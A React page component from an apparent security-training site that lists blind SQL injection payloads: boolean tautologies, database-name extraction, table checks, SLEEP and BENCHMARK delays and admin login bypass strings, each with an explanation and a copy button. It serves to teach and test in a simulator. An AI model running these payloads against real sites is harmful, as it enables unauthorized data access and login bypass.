import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, EyeOff, Copy, Check, Search, Terminal } from 'lucide-react';

const payloadSections = [
  {
    id: 'basic-boolean',
    title: 'Basic Boolean',
    description: 'Boolean-based blind injection tests how the web application responds when queries evaluate to either true or false. These payloads allow testers to verify vulnerability by checking for differences in responses.',
    payloads: [
      { code: "' AND 1=1 -- ", desc: 'Basic true condition injected via boolean comparison. Used to verify that the query runs normally.', tags: ['Boolean', 'Standard'] },
      { code: "' AND 1=2 -- ", desc: 'Basic false condition. If the page structure changes (e.g. error or missing result), the parameter is confirmed vulnerable.', tags: ['Boolean', 'Standard'] },
      { code: "admin' AND 1=1 -- ", desc: 'Injects a true comparison directly targeting the admin user account filter.', tags: ['Boolean', 'Targeted'] },
      { code: "admin' AND 1=2 -- ", desc: 'Injects a false comparison targeting the admin user account, causing authentication to fail.', tags: ['Boolean', 'Targeted'] },
      { code: "admin' AND 'a'='a' -- ", desc: 'String comparison boolean verification targeting the admin user account.', tags: ['Boolean', 'String'] },
      { code: "admin' AND 'a'='b' -- ", desc: 'Unmatching string comparison boolean check targeting the admin user account.', tags: ['Boolean', 'String'] },
      { code: "' AND 2>1 -- ", desc: "Alternative integer tautology check, useful to bypass basic filters looking for '1=1'.", tags: ['Boolean', 'Bypass'] },
      { code: "' AND 2<1 -- ", desc: "Alternative integer contradiction check, useful to bypass filters looking for '1=2'.", tags: ['Boolean', 'Bypass'] }
    ]
  },
  {
    id: 'db-table-checks',
    title: 'Database & Table Checks',
    description: 'These payloads extract information about the database itself, such as metadata, database name length, or checking whether specific system or application tables exist.',
    payloads: [
      { code: "' AND LENGTH(database()) > 0 -- ", desc: 'Probes the length of the current database name. Used in character-by-character extraction.', tags: ['Metadata', 'Length'] },
      { code: "' AND (SELECT COUNT(*) FROM users) > 0 -- ", desc: "Checks if a 'users' table exists in the database. Returns true if the table exists.", tags: ['Metadata', 'Existence'] },
      { code: "admin' AND (SELECT COUNT(*) FROM users) > 0 -- ", desc: 'Table existence check targeting the admin user filter.', tags: ['Metadata', 'Existence'] }
    ]
  },
  {
    id: 'string-based',
    title: 'String-based',
    description: 'String-based functions are injected to extract database characters by isolating specific parts of strings (like database or table names) and verifying their characters one by one.',
    payloads: [
      { code: "' AND SUBSTRING(database(),1,1) = 's' -- ", desc: "Extracts and evaluates the first character of the database name. Returns true if it matches 's'.", tags: ['Extraction', 'Substring'] },
      { code: "' AND 'admin' = 'admin' -- ", desc: 'Basic string-based equality comparison evaluating to true.', tags: ['String', 'Standard'] },
      { code: "admin' AND 'admin' = 'admin' -- ", desc: 'String-based true comparison combined with admin account filter.', tags: ['String', 'Targeted'] }
    ]
  },
  {
    id: 'parentheses-variations',
    title: 'Parentheses Variations',
    description: 'Queries are often nested or grouped inside parentheses in the backend. These variations escape parentheses boundaries before executing logical boolean operations.',
    payloads: [
      { code: "') AND 1=1 -- ", desc: 'Closes a parenthesized string query first, then evaluates the boolean condition.', tags: ['Parenthesis', 'Boolean'] },
      { code: "') AND 1=2 -- ", desc: 'Closes a parenthesized query, followed by a false boolean condition.', tags: ['Parenthesis', 'Boolean'] },
      { code: "')) AND 1=1 -- ", desc: 'Closes a double-parenthesized query structure before injecting the boolean statement.', tags: ['Parenthesis', 'Boolean'] }
    ]
  },
  {
    id: 'time-based-blind',
    title: 'Time-based Blind',
    description: 'When database errors or structural modifications are suppressed, time-based payloads force the database to wait (sleep) for a specific number of seconds to verify output changes.',
    payloads: [
      { code: "' AND SLEEP(4) -- ", desc: 'Injects a sleep delay of 4 seconds on MySQL backends. If the server response is delayed, injection is confirmed.', tags: ['Time Delay', 'MySQL'] },
      { code: "admin' AND SLEEP(4) -- ", desc: 'Applies the time delay function targeting the admin user query.', tags: ['Time Delay', 'MySQL'] },
      { code: "') AND SLEEP(3) -- ", desc: 'Closes a parenthesized statement before triggering a 3-second sleep delay.', tags: ['Time Delay', 'Parenthesis'] },
      { code: "' AND BENCHMARK(4000000, MD5(1)) -- ", desc: 'Forces the server to execute MD5 hashing 4 million times, creating a time delay on MySQL.', tags: ['Time Delay', 'Benchmark'] }
    ]
  },
  {
    id: 'login-bypass-style',
    title: 'More Realistic Login Bypass Style',
    description: 'These payloads demonstrate how blind SQL injection operates under authentication structures, isolating individual credentials or bypassing typical login query constraints.',
    payloads: [
      { code: "admin' AND 1=1 -- ", desc: 'Injects standard true statement next to the admin identifier.', tags: ['Login Style', 'Tautology'] },
      { code: "admin' AND (1=1) -- ", desc: 'Parenthesized logical statement combined with the admin filter.', tags: ['Login Style', 'Parenthesis'] },
      { code: "' OR '1'='1' AND '1'='2", desc: 'Checks logical precedence of operators. If OR runs before AND, the statement evaluates differently.', tags: ['Login Style', 'Precedence'] },
      { code: "admin' AND '1'='1' -- ", desc: 'Matches admin username while verifying a true statement, ensuring login success if credential checks are vulnerable.', tags: ['Login Style', 'Targeted'] },
      { code: "1' AND 1=1 -- ", desc: 'Appends true logical condition starting with integer parameter input.', tags: ['Login Style', 'Numeric'] }
    ]
  }
];

export default function BlindInjectionPayloads() {
  const [copiedText, setCopiedText] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const allPayloads = [];
  payloadSections.forEach(section => {
    section.payloads.forEach(p => {
      allPayloads.push({
        ...p,
        sectionId: section.id,
        sectionTitle: section.title
      });
    });
  });

  const filteredPayloads = allPayloads.filter((p) => {
    const query = searchTerm.toLowerCase();
    return (
      p.code.toLowerCase().includes(query) ||
      p.desc.toLowerCase().includes(query) ||
      p.tags.some((t) => t.toLowerCase().includes(query))
    );
  });

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-10 select-none w-full max-w-5xl mx-auto">
      {/* Back Link */}
      <div className="flex items-center justify-between">
        <Link to="/payload-library" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" />
          back to payload library dashboard
        </Link>
        <span className="text-[10px] font-mono text-cyber-dim">MODULE: BLIND_INFERENCE_v1.0</span>
      </div>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full relative">
        <div className="absolute -top-4 right-0 w-24 h-24 bg-cyber-blue/10 blur-[40px] rounded-full pointer-events-none" />
        <span className="text-xs font-mono font-bold text-cyber-blue tracking-[4px] uppercase flex items-center gap-2">
          <EyeOff className="w-4.5 h-4.5 text-cyber-blue" />
          MODULE 04 — BLiND & TiME-BASED INJECTiONS
        </span>
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Blind SQL <span className="text-cyber-blue">Payloads</span>
        </h1>
        <p className="text-cyber-dim text-sm text-justify leading-relaxed">
          Side-channel extraction payloads utilizing boolean evaluations and forced time delays to reconstruct remote database systems.
        </p>
      </div>

      {/* Interactive Search Bar */}
      <div className="relative w-full max-w-md">
        <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
        <input
          type="text"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          placeholder="Search blind SQL payloads..."
          className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all text-xs font-mono"
        />
      </div>

      {/* Main Payload Grid Section */}
      <div className="space-y-6">
        <div className="bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-lg">
          <div className="grid grid-cols-12 gap-3 px-6 py-3 border-b border-cyber-border bg-cyber-pre text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase">
            <div className="col-span-4">Payload (SQL Code)</div>
            <div className="col-span-5">Mechanism & Impact Description</div>
            <div className="col-span-2">Tags</div>
            <div className="col-span-1 text-right">Actions</div>
          </div>

          <div className="divide-y divide-cyber-border/40 font-mono text-sm">
            {filteredPayloads.length > 0 ? (
              filteredPayloads.map((payload, pIdx) => (
                <div
                  key={pIdx}
                  className="grid grid-cols-12 gap-3 px-6 py-4 items-center hover:bg-cyber-blue/[0.02] transition-colors group"
                >
                  {/* Payload Code */}
                  <div className="col-span-4 select-text">
                    <code className="text-cyber-blue-light font-bold bg-cyber-pre/80 px-2.5 py-1.5 rounded-lg border border-cyber-border/60 block overflow-x-auto whitespace-nowrap">
                      {payload.code}
                    </code>
                  </div>

                  {/* Description */}
                  <div className="col-span-5 text-xs text-cyber-text leading-relaxed select-text font-sans">
                    {payload.desc}
                  </div>

                  {/* Tags */}
                  <div className="col-span-2 flex flex-wrap gap-1">
                    {payload.tags.map((tag, tIdx) => (
                      <span
                        key={tIdx}
                        className="text-[9px] font-bold uppercase tracking-wider bg-cyber-blue/10 border border-cyber-blue/20 text-cyber-blue-light px-1.5 py-0.2 rounded"
                      >
                        {tag}
                      </span>
                    ))}
                  </div>

                  {/* Actions */}
                  <div className="col-span-1 flex items-center justify-end gap-2">
                    <button
                      onClick={() => handleCopy(payload.code)}
                      className="p-1.5 rounded bg-cyber-pre border border-cyber-border hover:border-cyber-blue hover:bg-cyber-blue/5 text-cyber-dim hover:text-cyber-blue-light transition-all cursor-pointer relative"
                      title="Copy payload to clipboard"
                    >
                      {copiedText === payload.code ? (
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-12 text-center text-cyber-dim font-mono text-sm">
                No matching payloads found for "{searchTerm}"
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Sandbox Redirection */}
      <div className="bg-cyber-card border border-cyber-border/70 rounded-2xl p-8 text-center space-y-5 shadow-2xl relative overflow-hidden">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyber-blue to-transparent" />
        <h3 className="font-sans font-extrabold text-lg text-cyber-title tracking-wider uppercase">
          Simulate this in our Interactive Blind SQLi Environment!
        </h3>
        <p className="text-sm text-cyber-text text-justify leading-relaxed">
          Test these payloads inside our live Blind SQLi Simulator to witness real-time boolean conditions, time delay responses, and verify blind extraction sequences!
        </p>
        <div className="pt-2 flex justify-center">
          <Link
            to="/attacks/blind-injection"
            className="inline-flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white px-8 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_rgba(26,106,255,0.3)] hover:shadow-[0_0_25px_rgba(26,106,255,0.5)] transform hover:-translate-y-0.5"
          >
            Launch Live Blind SQLi Simulator
          </Link>
        </div>
      </div>
    </div>
  );
}
